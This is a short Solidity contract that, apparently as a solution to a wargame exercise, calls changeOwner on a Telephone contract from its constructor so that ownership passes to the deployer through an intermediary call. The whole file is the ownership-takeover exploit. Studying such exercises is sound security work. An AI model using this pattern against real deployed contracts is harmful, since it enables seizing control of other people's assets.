// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Telephone} from "./Telephone.sol";

contract TelephoneCaller {
    constructor(address _telephone) {
        Telephone(_telephone).changeOwner(msg.sender);
    }
}
